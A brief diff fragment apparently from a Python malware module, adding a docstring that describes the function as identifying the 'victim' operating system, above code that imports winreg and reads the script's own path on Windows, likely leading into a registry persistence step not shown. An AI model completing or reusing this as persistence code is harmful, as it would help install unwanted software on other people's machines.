@@ -2,6 +2,11 @@ import os
 import winreg as reg
 
 def run(**args):
+    
+    """
+    It indicates the operating system of the victim
+    
+    """
     if os.name == 'nt':
         try:
             file_path = os.path.realpath(__file__)
